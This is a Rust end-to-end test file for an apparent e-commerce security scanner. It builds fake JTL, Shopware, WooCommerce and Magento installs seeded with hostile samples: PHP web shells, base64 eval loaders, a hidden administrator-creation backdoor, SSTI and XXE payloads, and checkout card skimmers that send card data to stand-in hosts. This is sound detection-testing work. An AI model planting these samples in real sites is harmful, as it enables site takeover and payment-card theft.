//! End-to-end tests against the compiled binary using synthetic shop trees.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_ecomsec"))
}

fn write(root: &Path, rel: &str, content: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

fn backdate(root: &Path) {
    // 2025-01-01 – before the default reference date.
    let t = filetime::FileTime::from_unix_time(1_735_689_600, 0);
    for entry in walkdir::WalkDir::new(root) {
        let entry = entry.unwrap();
        if entry.file_type().is_file() {
            filetime::set_file_mtime(entry.path(), t).unwrap();
        }
    }
}

fn jtl_fixture(root: &Path) {
    write(
        root,
        "includes/config.JTL-Shop.ini.php",
        b"<?php\ndefine('URL_SHOP', 'https://demo.example');\ndefine('DB_HOST','127.0.0.1');\ndefine('DB_NAME','x');\ndefine('DB_USER','u');\ndefine('DB_PASS','p');\n",
    );
    write(
        root,
        "includes/defines.php",
        b"<?php\nconst APPLICATION_VERSION = '5.3.1';\n",
    );
    write(
        root,
        "includes/src/Smarty/MailSmarty.php",
        b"<?php\n$this->registerPlugin('modifier', 'unserialize', 'unserialize');\n",
    );
    write(root, "admin/index.php", b"<?php echo 1;");
    write(
        root,
        "mediafiles/Bilder/wso.php",
        b"<?php eval(base64_decode('x'));",
    );
    write(
        root,
        "mediafiles/.htaccess",
        b"AddHandler application/x-httpd-php .png\n",
    );
    write(
        root,
        "jtllogs/shop.log",
        b"vorname={capture name=a}x{/capture}{eval var=$smarty.capture.a}\n",
    );
    write(root, "backup.sql", b"CREATE TABLE t;");
    write(
        root,
        "templates_c/compiled.php",
        b"<?php /* smarty compiled */ echo 'x';",
    );
    backdate(root);
}

fn scan_json(root: &Path, state: &Path, extra: &[&str]) -> serde_json::Value {
    let out = bin()
        .env("ECOMSEC_STATE_DIR", state)
        .args(["scan", "--root"])
        .arg(root)
        .args(["--skip-remote", "--format", "json", "--fail-on", "never"])
        .args(extra)
        .output()
        .expect("run ecomsec");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    serde_json::from_slice(&out.stdout).expect("valid json")
}

fn rules_of(report: &serde_json::Value) -> Vec<(String, String)> {
    report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            (
                f["rule"].as_str().unwrap().to_string(),
                f["subject"].as_str().unwrap().to_string(),
            )
        })
        .collect()
}

#[test]
fn jtl_scan_detects_planted_artifacts_and_patch_state() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);

    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["id"], "jtl5");
    assert_eq!(report["platform"]["version"], "5.3.1");
    assert_eq!(report["verdict"], "critical");
    let rules = rules_of(&report);
    let has = |r: &str, s: &str| rules.iter().any(|(a, b)| a == r && b == s);
    assert!(has("ioc_filename", "mediafiles/Bilder/wso.php"));
    assert!(has("php_in_upload_dir", "mediafiles/Bilder/wso.php"));
    assert!(has("php_eval_base64", "mediafiles/Bilder/wso.php"));
    assert!(has(
        "htaccess_php_handler_for_non_php",
        "mediafiles/.htaccess"
    ));
    assert!(has("jtl_ssti_capture_eval", "jtllogs/shop.log"));
    assert!(has("exposed_file", "backup.sql"));
    assert!(has("advisory_cve-2026-54390", "5.3.1"));
    let adv = &report["advisories"][0];
    assert_eq!(adv["state"], "vulnerable");
    assert!(adv["basis"].as_str().unwrap().contains("unserialize"));
    assert!(report["recommendations"].as_array().unwrap().len() >= 3);
    assert!(report["integrity"]
        .as_array()
        .unwrap()
        .iter()
        .any(|i| i["key"] == "patch.cve-2026-54390"));
}

#[test]
fn patched_version_is_reported_as_patched() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    write(
        &root,
        "includes/defines.php",
        b"<?php\nconst APPLICATION_VERSION = '5.7.2';\n",
    );
    backdate(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["advisories"][0]["state"], "patched");
    assert!(!rules_of(&report)
        .iter()
        .any(|(r, _)| r.starts_with("advisory_")));
}

#[test]
fn backpatch_marker_in_renderer_counts_as_patched() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    write(
        &root,
        "includes/src/Smarty/MailSmarty.php",
        b"<?php // modifiers removed\n",
    );
    write(
        &root,
        "includes/src/Mail/Renderer/SmartyRenderer.php",
        b"<?php\n// Fix for CVE-2026-54390\n$this->smarty->setSecurityPolicy(new Security());\n",
    );
    backdate(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["advisories"][0]["state"], "patched");
    assert!(report["advisories"][0]["basis"]
        .as_str()
        .unwrap()
        .contains("SmartyRenderer.php"));
}

#[test]
fn acceptance_persists_across_scans_and_changes_verdict() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    // Remove everything critical except the dump and make the shop patched.
    fs::remove_dir_all(root.join("mediafiles")).unwrap();
    fs::remove_dir_all(root.join("jtllogs")).unwrap();
    write(
        &root,
        "includes/defines.php",
        b"<?php\nconst APPLICATION_VERSION = '5.7.2';\n",
    );
    backdate(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["verdict"], "critical");
    let dump_id = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["rule"] == "exposed_file")
        .map(|f| f["id"].as_str().unwrap().to_string())
        .unwrap();

    let out = bin()
        .env("ECOMSEC_STATE_DIR", &state)
        .args(["findings", "accept", "--root"])
        .arg(&root)
        .args([&dump_id, "--reason", "Testdump"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let report = scan_json(&root, &state, &[]);
    let dump = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["id"] == dump_id)
        .unwrap();
    assert_eq!(dump["accepted"], true);
    assert_eq!(dump["accepted_reason"], "Testdump");
    assert_eq!(report["summary"]["accepted"], 1);
    assert_ne!(report["verdict"], "critical");
}

#[test]
fn time_budget_resumes_and_html_export_works() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    for i in 0..30 {
        write(
            &root,
            &format!("includes/src/F{i}.php"),
            b"<?php class F {}",
        );
    }
    backdate(&root);
    let first = scan_json(&root, &state, &["--time-budget", "1ms"]);
    assert_eq!(first["summary"]["complete"], false);
    let second = scan_json(&root, &state, &[]);
    assert_eq!(second["summary"]["complete"], true);
    assert!(second["summary"]["files_scanned"].as_u64().unwrap() >= 38);

    let html: PathBuf = tmp.path().join("report.html");
    let out = bin()
        .env("ECOMSEC_STATE_DIR", &state)
        .args(["report", "--root"])
        .arg(&root)
        .args(["--format", "html", "--output"])
        .arg(&html)
        .output()
        .unwrap();
    assert!(out.status.success());
    let text = fs::read_to_string(&html).unwrap();
    assert!(text.contains("\"static\""));
    assert!(text.contains("jtl_ssti_capture_eval"));
}

#[test]
fn baseline_diff_reports_changes() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    let ok = bin()
        .env("ECOMSEC_STATE_DIR", &state)
        .args(["baseline", "create", "--root"])
        .arg(&root)
        .status()
        .unwrap();
    assert!(ok.success());
    write(&root, "admin/index.php", b"<?php echo 2;");
    write(&root, "includes/new.php", b"<?php");
    let out = bin()
        .env("ECOMSEC_STATE_DIR", &state)
        .args(["baseline", "diff", "--root"])
        .arg(&root)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("GEÄNDERT  admin/index.php"));
    assert!(text.contains("NEU       includes/new.php"));
    assert_eq!(out.status.code(), Some(1));

    let report = scan_json(&root, &state, &[]);
    assert!(rules_of(&report)
        .iter()
        .any(|(r, s)| r == "baseline_changed" && s == "admin/index.php"));
}

#[test]
fn shopware_detection_and_twig_rules() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("sw");
    let state = tmp.path().join("state");
    write(
        &root,
        "composer.json",
        br#"{"require":{"shopware/core":"6.5.7.3"}}"#,
    );
    write(
        &root,
        "composer.lock",
        br#"{"packages":[{"name":"shopware/core","version":"v6.5.7.3"}]}"#,
    );
    write(
        &root,
        ".env",
        b"APP_ENV=dev\nDATABASE_URL=mysql://u:p@127.0.0.1/sw\n",
    );
    write(&root, "public/index.php", b"<?php");
    write(
        &root,
        "public/media/x/shell.php",
        b"<?php @eval($_POST['c']);",
    );
    write(
        &root,
        "custom/plugins/P/src/mail.html.twig",
        b"{{ ['id']|filter('system') }}",
    );
    write(
        &root,
        "public/.htaccess",
        b"php_value auto_prepend_file /tmp/x.php\n",
    );
    backdate(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["id"], "shopware6");
    let rules = rules_of(&report);
    let has = |r: &str| rules.iter().any(|(a, _)| a == r);
    assert!(has("php_in_upload_dir"));
    assert!(has("shopware_twig_ssti_filter_exec"));
    assert!(has("htaccess_auto_prepend"));
    assert!(has("app_env_not_prod"));
    assert!(has("advisory_cve-2024-22406"));
}

#[test]
fn unknown_directory_fails_with_exit_10() {
    let out = bin()
        .args(["scan", "--root", "/definitely/not/here"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(10));
}

#[test]
fn advisories_lint_and_list_work_on_repo_files() {
    let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../advisories");
    let out = bin()
        .args(["advisories", "lint"])
        .arg(&repo)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let out = bin()
        .args(["advisories", "list", "--platform", "jtl5"])
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("CVE-2026-54390"));
}

#[test]
fn extra_advisory_dir_overrides_embedded_entries() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("shop");
    let state = tmp.path().join("state");
    jtl_fixture(&root);
    write(
        &root,
        "includes/defines.php",
        b"<?php\nconst APPLICATION_VERSION = '5.7.2';\n",
    );
    backdate(&root);
    let adv = tmp.path().join("adv");
    write(
        &adv,
        "jtl5.toml",
        b"[[advisory]]\nid = \"CVE-2099-0001\"\nplatform = \"jtl5\"\ntitle = \"Test\"\nseverity = \"warning\"\naffected = [\"<9.0\"]\nfixed_in = [\"9.0\"]\npublished = 2026-10-01\n",
    );
    let report = scan_json(&root, &state, &["--advisories", adv.to_str().unwrap()]);
    let ids: Vec<&str> = report["advisories"]
        .as_array()
        .unwrap()
        .iter()
        .map(|a| a["advisory"]["id"].as_str().unwrap())
        .collect();
    assert!(ids.contains(&"CVE-2099-0001"));
    assert!(ids.contains(&"CVE-2026-54390"));
    assert!(rules_of(&report)
        .iter()
        .any(|(r, _)| r == "advisory_cve-2099-0001"));
    // Without --online the dependency row says "nicht geprüft".
    let dep = report["integrity"]
        .as_array()
        .unwrap()
        .iter()
        .find(|i| i["key"] == "dependencies.osv")
        .unwrap();
    assert_eq!(dep["status"], "unknown");
}

// ---------------------------------------------------------------- WooCommerce

const WP_CONFIG: &[u8] = b"<?php\ndefine( 'DB_NAME', 'wp' );\ndefine( 'DB_USER', 'wp' );\ndefine( 'DB_PASSWORD', 'secret' );\ndefine( 'DB_HOST', '127.0.0.1:3307' );\ndefine( 'AUTH_KEY', 'put your unique phrase here' );\n$table_prefix = 'shop_';\nrequire_once ABSPATH . 'wp-settings.php';\n";

fn woocommerce_fixture(root: &Path) {
    write(
        root,
        "wp-includes/version.php",
        b"<?php\n$wp_version = '6.4.2';\n",
    );
    write(root, "wp-settings.php", b"<?php // settings");
    write(root, "wp-admin/index.php", b"<?php // admin");
    write(
        root,
        "index.php",
        b"<?php\n@include \"\\x2fvar/tmp/.cache/favicon_3a1b.ico\";\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';\n",
    );
    write(
        root,
        "wp-content/plugins/woocommerce/woocommerce.php",
        b"<?php\n/**\n * Plugin Name: WooCommerce\n * Version: 8.9.1\n * Author: Automattic\n */\n",
    );
    write(
        root,
        "wp-content/plugins/akismet/akismet.php",
        b"<?php\n/*\nPlugin Name: Akismet Anti-spam\nVersion: 5.3\n*/\n",
    );
    // Fake plugin folder without header and with a random name.
    write(
        root,
        "wp-content/plugins/xkqzwpvb/loader.php",
        b"<?php $k = 'x'; echo $k;",
    );
    write(
        root,
        "wp-content/mu-plugins/wp-cache-helper.php",
        b"<?php eval(base64_decode(get_option('wp_cache_blob')));",
    );
    write(
        root,
        "wp-content/uploads/2024/05/shell.php",
        b"<?php @eval($_POST['c']);",
    );
    write(
        root,
        "wp-content/uploads/2024/05/favicon.ico",
        b"<?php $a = base64_decode($_POST['p']); eval($a);",
    );
    write(
        root,
        "wp-content/themes/shopy/style.css",
        b"/*\nTheme Name: Shopy\nVersion: 1.2\n*/",
    );
    write(
        root,
        "wp-content/themes/shopy/functions.php",
        b"<?php add_action('init', function () { if (isset($_GET['sync'])) { $id = wp_create_user('wpsupport', 'x', 'a@b.ru'); $u = new WP_User($id); $u->set_role('administrator'); } });",
    );
    write(
        root,
        "wp-content/themes/shopy/js/checkout.js",
        b"jQuery('form.checkout').on('checkout_place_order', function () { var d = btoa(JSON.stringify({c: jQuery('#stripe-card-number').val()})); new Image().src = 'https://jquery-cdn.top/p.gif?d=' + d; });",
    );
    backdate(root);
}

#[test]
fn woocommerce_detection_rules_and_component_advisories() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("wp");
    let state = tmp.path().join("state");
    write(&root, "wp-config.php", WP_CONFIG);
    woocommerce_fixture(&root);

    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["id"], "woocommerce");
    assert_eq!(report["platform"]["version"], "6.4.2");
    assert_eq!(report["verdict"], "critical");
    let details = report["platform"]["details"].to_string();
    assert!(details.contains("WordPress mit WooCommerce"), "{details}");
    assert!(details.contains("8.9.1"));
    assert!(details.contains("shop_"));
    let rules = rules_of(&report);
    let has = |r: &str, s: &str| rules.iter().any(|(a, b)| a == r && b == s);
    assert!(has(
        "php_in_upload_dir",
        "wp-content/uploads/2024/05/shell.php"
    ));
    assert!(has(
        "wp_php_in_image_file",
        "wp-content/uploads/2024/05/favicon.ico"
    ));
    assert!(has(
        "wp_mu_plugin_suspicious",
        "wp-content/mu-plugins/wp-cache-helper.php"
    ));
    assert!(has(
        "php_eval_base64",
        "wp-content/mu-plugins/wp-cache-helper.php"
    ));
    assert!(has(
        "wp_plugin_without_header",
        "wp-content/plugins/xkqzwpvb"
    ));
    assert!(has(
        "wp_backdoor_admin_creation",
        "wp-content/themes/shopy/functions.php"
    ));
    assert!(has(
        "wc_checkout_skimmer",
        "wp-content/themes/shopy/js/checkout.js"
    ));
    assert!(has("wp_index_php_modified", "index.php"));
    assert!(has("wp_include_non_php_file", "index.php"));
    assert!(rules.iter().any(|(r, _)| r == "wp_weak_salts"));
    // WordPress core advisories use the WordPress version …
    assert!(has("advisory_cve-2024-31210", "6.4.2"));
    // … WooCommerce advisories the plugin version.
    assert!(has("advisory_cve-2024-37297", "WooCommerce 8.9.1"));
    assert!(has("advisory_cve-2025-15033", "WooCommerce 8.9.1"));
    let state_of = |id: &str| {
        report["advisories"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["advisory"]["id"] == id)
            .map(|a| a["state"].as_str().unwrap().to_string())
            .unwrap()
    };
    assert_eq!(state_of("CVE-2022-21661"), "patched");
    assert_eq!(state_of("CVE-2021-32790"), "patched");
    assert_eq!(state_of("CVE-2024-37297"), "vulnerable");
    let integrity = report["integrity"].as_array().unwrap();
    let item = |k: &str| integrity.iter().find(|i| i["key"] == k).cloned();
    assert_eq!(item("plugin.woocommerce").unwrap()["value"], "8.9.1");
    assert_eq!(item("wp.mu_plugins").unwrap()["status"], "critical");
    assert_eq!(item("dependencies.wporg").unwrap()["status"], "unknown");
    assert!(report["recommendations"]
        .to_string()
        .contains("DISALLOW_FILE_EDIT"));
}

#[test]
fn plain_wordpress_with_config_above_webroot() {
    let tmp = tempfile::tempdir().unwrap();
    let site = tmp.path().join("site");
    let root = site.join("public_html");
    let state = tmp.path().join("state");
    write(&site, "wp-config.php", WP_CONFIG);
    write(
        &root,
        "wp-includes/version.php",
        b"<?php\n$wp_version = '6.5.2';\n",
    );
    write(&root, "wp-settings.php", b"<?php");
    write(
        &root,
        "index.php",
        b"<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';\n",
    );
    backdate(&root);
    backdate(&site);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["id"], "woocommerce");
    let details = report["platform"]["details"].to_string();
    assert!(details.contains("ohne WooCommerce"), "{details}");
    assert!(details.contains("oberhalb des Webroots"), "{details}");
    for a in report["advisories"].as_array().unwrap() {
        let id = a["advisory"]["id"].as_str().unwrap();
        if a["advisory"]["component"] == "WooCommerce" {
            assert_eq!(a["state"], "not_affected", "{id}");
        } else {
            assert_eq!(a["state"], "patched", "{id}");
        }
    }
    let rules = rules_of(&report);
    assert!(!rules.iter().any(|(r, _)| r == "wp_index_php_modified"));
    assert!(!rules.iter().any(|(r, _)| r.starts_with("advisory_")));
}

// ---------------------------------------------------------------- Magento 2

fn magento_fixture(root: &Path) {
    write(
        root,
        "composer.json",
        br#"{"require":{"magento/product-community-edition":"2.4.6-p5"}}"#,
    );
    write(
        root,
        "composer.lock",
        br#"{"packages":[{"name":"magento/framework","version":"103.0.6-p5"},{"name":"magento/product-community-edition","version":"2.4.6-p5"}]}"#,
    );
    write(root, "bin/magento", b"#!/usr/bin/env php\n<?php");
    write(
        root,
        "app/etc/env.php",
        b"<?php\nreturn [\n  'backend' => ['frontName' => 'admin'],\n  'crypt' => ['key' => 'abcdefabcdefabcdefabcdefabcdefab'],\n  'db' => ['table_prefix' => '', 'connection' => ['default' => ['host' => '127.0.0.1', 'dbname' => 'm2', 'username' => 'm2', 'password' => 'pw']]],\n  'MAGE_MODE' => 'developer',\n];\n",
    );
    write(
        root,
        "app/etc/config.php",
        b"<?php\nreturn ['modules' => ['Magento_Store' => 1, 'Magento_TwoFactorAuth' => 0, 'Evil_Mod' => 1]];\n",
    );
    write(
        root,
        "pub/index.php",
        b"<?php\ntry {\n    require __DIR__ . '/../app/bootstrap.php';\n} catch (\\Exception $e) { exit(1); }\nif (isset($_COOKIE['dbg'])) { eval(base64_decode($_COOKIE['dbg'])); }\n",
    );
    write(
        root,
        "pub/media/catalog/product/cache/x.php",
        b"<?php system($_GET['c']);",
    );
    write(
        root,
        "app/code/Evil/Mod/etc/frontend/routes.xml",
        br#"<config><router id="standard"><route id="evil" frontName="admin"><module name="Evil_Mod"/></route></router></config>"#,
    );
    write(
        root,
        "app/code/Evil/Mod/view/frontend/requirejs-config.js",
        b"var config = { map: { '*': { 'checkout-helper': 'https://static-cdn.top/helper.js' } } };",
    );
    write(
        root,
        "app/code/Evil/Mod/view/frontend/web/template/payment.html",
        b"<script>document.addEventListener('submit',function(){var d=btoa(JSON.stringify({n:document.getElementsByName('payment[cc_number]')[0].value}));new Image().src='https://magento-stats.top/i.gif?'+d;});</script>",
    );
    write(
        root,
        "var/log/system.log",
        b"[2026-07-01] main.CRITICAL: POST /rest/V1/guest-carts/abc/estimate-shipping-methods {\"address\":{\"totalsCollector\":{\"collectorList\":{\"totalCollector\":{\"sourceData\":{\"data\":\"<!DOCTYPE r [ <!ENTITY % x SYSTEM \\\"http://evil.top/x.dtd\\\"> %x; ]>\",\"dataIsURL\":false}}}}}}\n",
    );
    backdate(root);
}

#[test]
fn magento_detection_rules_and_patch_levels() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("m2");
    let state = tmp.path().join("state");
    magento_fixture(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["id"], "magento2");
    assert_eq!(report["platform"]["version"], "2.4.6-p5");
    assert_eq!(report["verdict"], "critical");
    assert!(report["platform"]["details"]
        .to_string()
        .contains("Magento Open Source"));
    let rules = rules_of(&report);
    let has = |r: &str, s: &str| rules.iter().any(|(a, b)| a == r && b == s);
    assert!(has(
        "php_in_upload_dir",
        "pub/media/catalog/product/cache/x.php"
    ));
    assert!(has("magento_entry_point_modified", "pub/index.php"));
    assert!(has(
        "magento_admin_route_hijack",
        "app/code/Evil/Mod/etc/frontend/routes.xml"
    ));
    assert!(rules
        .iter()
        .any(|(r, s)| r == "magento_requirejs_foreign_url" && s.ends_with(":static-cdn.top")));
    assert!(has(
        "magento_requirejs_remote_dep",
        "app/code/Evil/Mod/view/frontend/requirejs-config.js"
    ));
    assert!(has(
        "magento_payment_skimmer",
        "app/code/Evil/Mod/view/frontend/web/template/payment.html"
    ));
    assert!(has("magento_cosmicsting_xxe", "var/log/system.log"));
    assert!(rules
        .iter()
        .any(|(r, _)| r == "magento_mode_not_production"));
    assert!(rules.iter().any(|(r, _)| r == "magento_2fa_disabled"));
    assert!(rules.iter().any(|(r, _)| r == "magento_default_admin_url"));
    assert!(has("advisory_cve-2024-34102", "2.4.6-p5"));
    assert!(has("advisory_cve-2025-54236", "2.4.6-p5"));
    let state_of = |id: &str| {
        report["advisories"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["advisory"]["id"] == id)
            .map(|a| a["state"].as_str().unwrap().to_string())
            .unwrap()
    };
    assert_eq!(state_of("CVE-2022-24086"), "patched");
    // Adobe-Commerce-only advisory on Open Source.
    assert_eq!(state_of("CVE-2024-20720"), "not_affected");
    assert_eq!(state_of("CVE-2024-34102"), "vulnerable");
    let osv = report["integrity"]
        .as_array()
        .unwrap()
        .iter()
        .find(|i| i["key"] == "dependencies.osv")
        .unwrap();
    assert_eq!(osv["status"], "unknown");
    assert!(report["recommendations"].to_string().contains("Crypt-Key"));
}

#[test]
fn magento_patched_release_is_not_vulnerable() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("m2");
    let state = tmp.path().join("state");
    magento_fixture(&root);
    write(
        &root,
        "composer.lock",
        br#"{"packages":[{"name":"magento/product-community-edition","version":"2.4.6-p13"}]}"#,
    );
    backdate(&root);
    let report = scan_json(&root, &state, &[]);
    assert_eq!(report["platform"]["version"], "2.4.6-p13");
    for a in report["advisories"].as_array().unwrap() {
        assert_ne!(a["state"], "vulnerable", "{}", a["advisory"]["id"]);
    }
}

#[test]
fn new_platforms_are_listed() {
    let out = bin().arg("platforms").output().unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("woocommerce"));
    assert!(text.contains("magento2"));
    for (platform, id) in [
        ("woocommerce", "CVE-2025-15033"),
        ("magento2", "CVE-2024-34102"),
    ] {
        let out = bin()
            .args(["advisories", "list", "--platform", platform])
            .output()
            .unwrap();
        assert!(
            String::from_utf8_lossy(&out.stdout).contains(id),
            "{platform}"
        );
    }
}
